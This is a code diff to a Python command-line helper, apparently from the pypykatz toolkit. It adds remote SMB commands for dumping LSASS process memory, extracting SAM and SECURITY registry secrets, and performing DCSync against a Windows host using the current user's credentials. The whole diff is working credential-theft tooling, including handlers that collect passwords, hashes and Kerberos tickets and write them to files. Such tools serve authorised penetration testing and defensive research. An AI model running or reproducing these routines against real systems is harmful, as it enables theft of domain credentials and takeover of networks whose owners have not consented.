@@ -125,7 +125,7 @@ class SMBCMDHelper:
 
 
 		live_subcommand_parser = argparse.ArgumentParser(add_help=False)                                                                                                  
-		live_smb_subparsers = live_subcommand_parser.add_subparsers(help = 'LIVE DPAPI commands work under the current user context. Except: keys, wifi, chrome')
+		live_smb_subparsers = live_subcommand_parser.add_subparsers(help = 'LIVE SMB commands work under the current user context.')
 		live_smb_subparsers.required = True
 		live_smb_subparsers.dest = 'livesmbcommand'
 
@@ -136,6 +136,61 @@ class SMBCMDHelper:
 		live_client_parser.add_argument('host', help='Target host to connect to')
 		live_client_parser.add_argument('commands', nargs='*', help="!OPTIONAL! Takes a series of commands which will be executed until error encountered. If the command is 'i' is encountered during execution it drops back to interactive shell.")
 
+		live_lsassfile_group = live_smb_subparsers.add_parser('lsassfile', help='Parse a remote LSASS dump file.')
+		live_lsassfile_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		live_lsassfile_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
+		live_lsassfile_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
+		live_lsassfile_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
+		live_lsassfile_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
+		live_lsassfile_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
+		live_lsassfile_group.add_argument('--chunksize', type=int, default=64*1024, help = 'Chunksize for file data retrival')
+		live_lsassfile_group.add_argument('-p','--packages', choices = ['all','msv', 'wdigest', 'tspkg', 'ssp', 'livessp', 'dpapi', 'cloudap'], nargs="+", default = 'all', help = 'LSASS package to parse')
+
+
+		live_lsassdump_group = live_smb_subparsers.add_parser('lsassdump', help='Yes.')
+		live_lsassdump_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		live_lsassdump_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
+		live_lsassdump_group.add_argument('-m','--method', choices=['taskexec'] , default = 'taskexec', help = 'Print credentials in JSON format')
+		live_lsassdump_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
+		live_lsassdump_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
+		live_lsassdump_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
+		live_lsassdump_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
+		live_lsassdump_group.add_argument('--chunksize', type=int, default=64*1024, help = 'Chunksize for file data retrival')
+		live_lsassdump_group.add_argument('-p','--packages', choices = ['all','msv', 'wdigest', 'tspkg', 'ssp', 'livessp', 'dpapi', 'cloudap'], nargs="+", default = 'all', help = 'LSASS package to parse')
+
+
+
+		live_regfile_group = live_smb_subparsers.add_parser('regfile', help='Parse a remote registry hive dumps')
+		live_regfile_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		live_regfile_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
+		live_regfile_group.add_argument('system', help='path to the SYSTEM registry hive')
+		live_regfile_group.add_argument('--sam', help='path to the SAM registry hive')
+		live_regfile_group.add_argument('--security', help='path to the SECURITY registry hive')
+		live_regfile_group.add_argument('--software', help='path to the SOFTWARE registry hive')
+		live_regfile_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
+		live_regfile_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
+		
+		live_regsec_group = live_smb_subparsers.add_parser('regdump', help='Regsecrets')
+		live_regsec_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		live_regsec_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
+		live_regsec_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
+		live_regsec_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
+
+		live_dcsync_group = live_smb_subparsers.add_parser('dcsync', help='DcSync')
+		live_dcsync_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		live_dcsync_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
+		live_dcsync_group.add_argument('-u', '--username', help='taget username')
+		live_dcsync_group.add_argument('-o', '--outfile', help = 'Save results to file')
+
+		live_secretsdump_group = live_smb_subparsers.add_parser('secretsdump', help='secretsdump')
+		live_secretsdump_group.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
+		live_secretsdump_group.add_argument('--protocol-version', choices=['2', '3'], default = '2', help= 'SMB protocol version. SMB1 is not supported.')
+		live_secretsdump_group.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
+		live_secretsdump_group.add_argument('-o', '--outfile', help = 'Save results to file (you can specify --json for json file, or text format will be written)')
+		live_secretsdump_group.add_argument('-k', '--kerberos-dir', help = 'Save kerberos tickets to a directory.')
+		live_secretsdump_group.add_argument('-g', '--grep', action='store_true', help = 'Print credentials in greppable format')
+		live_secretsdump_group.add_argument('--chunksize', type=int, default=64*1024, help = 'Chunksize for file data retrival')
+		live_secretsdump_group.add_argument('-p','--packages', choices = ['all','msv', 'wdigest', 'tspkg', 'ssp', 'livessp', 'dpapi', 'cloudap'], nargs="+", default = 'all', help = 'LSASS package to parse')
 
 		live_shareenum_parser = live_smb_subparsers.add_parser('shareenum', help = 'SMB (live) share enumerator. THE DEFAULT SETTINGS ARE OPTIMIZED TO WORK ON DOMAIN-JOINED MACHINES. This will start enumeration using the current user credentials.')
 		live_shareenum_parser.add_argument('--authmethod', choices=['ntlm', 'kerberos'], default = 'kerberos', help= 'Authentication method to use during login. If kerberos is used, the target must be DNS or hostname, NOT IP address!')
@@ -157,7 +212,6 @@ class SMBCMDHelper:
 		live_shareenum_parser.add_argument('--ed', '--exclude-dir', nargs='*', help = 'Exclude directories with name specified')
 		live_shareenum_parser.add_argument('--et', '--exclude-target', nargs='*', help = 'Exclude hosts from enumeration')
 
-
 		live_group = live_parser.add_parser('smb', help='SMB (live) commands', epilog=smb_live_epilog, parents=[live_subcommand_parser])
 		
 		
@@ -174,6 +228,10 @@ class SMBCMDHelper:
 			raise Exception('Live commands only work on Windows!')
 
 		from aiosmb import logger as smblog
+		from winacl.functions.highlevel import get_logon_info
+		
+		info = get_logon_info()
+		smb_url = 'smb%s+sspi-%s://%s\\%s@%s' % (args.protocol_version, args.authmethod, info['domain'], info['username'], args.host)
 
 		if args.verbose == 0:
 			smblog.setLevel(100)
@@ -185,10 +243,10 @@ class SMBCMDHelper:
 
 		if args.livesmbcommand == 'client':
 			from aiosmb.examples.smbclient import amain
-			from winacl.functions.highlevel import get_logon_info
-			info = get_logon_info()
+			
+			
 			la = SMBCMDArgs()
-			la.smb_url = 'smb%s+sspi-%s://%s\\%s@%s' % (args.protocol_version, args.authmethod, info['domain'], info['username'], args.host)
+			la.smb_url = smb_url
 			la.verbose = args.verbose
 
 			if args.commands is not None and len(args.commands) > 0:
@@ -203,6 +261,99 @@ class SMBCMDHelper:
 						la.commands.append(command)
 
 			await amain(la)
+
+		if args.livesmbcommand == 'lsassfile':
+			from pypykatz.smb.lsassutils import lsassfile
+			mimi = await lsassfile(smb_url, chunksize=args.chunksize, packages=args.packages)
+			self.process_results({'smbfile':mimi}, [], args)
+
+		elif args.livesmbcommand == 'lsassdump':
+			from pypykatz.smb.lsassutils import lsassdump
+			mimi = await lsassdump(smb_url, chunksize=args.chunksize, packages=args.packages)
+			self.process_results({'smbfile':mimi}, [], args)
+
+		elif args.livesmbcommand == 'secretsdump':
+			from pypykatz.smb.lsassutils import lsassdump
+			from pypykatz.smb.regutils import regdump
+			from pypykatz.smb.dcsync import dcsync
+
+			try:
+				mimi = await lsassdump(smb_url, chunksize=args.chunksize, packages=args.packages)
+				if mimi is not None:
+					self.process_results({'smbfile':mimi}, [], args, file_prefix='_lsass.txt')
+			except Exception as e:
+				logging.exception('[SECRETSDUMP] Failed to get LSASS secrets')
+			
+			try:
+				po = await regdump(smb_url)
+				if po is not None:
+					if args.outfile:
+						po.to_file(args.outfile+'_registry.txt', args.json)
+					else:
+						if args.json:
+							print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
+						else:
+							print(str(po))
+			except Exception as e:
+				logging.exception('[SECRETSDUMP] Failed to get registry secrets')
+			
+
+			try:
+				if args.outfile is not None:
+					outfile = open(args.outfile+'_dcsync.txt', 'w', newline = '')
+
+				async for secret in dcsync(smb_url):
+					if args.outfile is not None:
+						outfile.write(str(secret))
+					else:
+						print(str(secret))
+
+			except Exception as e:
+				logging.exception('[SECRETSDUMP] Failed to perform DCSYNC')
+			finally:
+				if args.outfile is not None:
+					outfile.close()
+		
+		elif args.livesmbcommand == 'dcsync':
+			from pypykatz.smb.dcsync import dcsync
+			
+			if args.outfile is not None:
+				outfile = open(args.outfile, 'w', newline = '')
+
+			async for secret in dcsync(smb_url, args.username):
+				if args.outfile is not None:
+					outfile.write(str(secret))
+				else:
+					print(str(secret))
+
+			if args.outfile is not None:
+				outfile.close()
+		
+		elif args.livesmbcommand == 'regdump':
+			from pypykatz.smb.regutils import regdump
+			po = await regdump(smb_url)
+
+			if po is not None:
+				if args.outfile:
+					po.to_file(args.outfile, args.json)
+				else:
+					if args.json:
+						print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
+					else:
+						print(str(po))
+		
+		elif args.livesmbcommand == 'regfile':
+			from pypykatz.smb.regutils import regfile
+			po = await regfile(smb_url, args.system, sam = args.sam, security = args.security, software = args.software)
+
+			if po is not None:
+				if args.outfile:
+					po.to_file(args.outfile, args.json)
+				else:
+					if args.json:
+						print(json.dumps(po.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True))
+					else:
+						print(str(po))
 
 		elif args.livesmbcommand == 'shareenum':
 			from pypykatz.smb.shareenum import shareenum
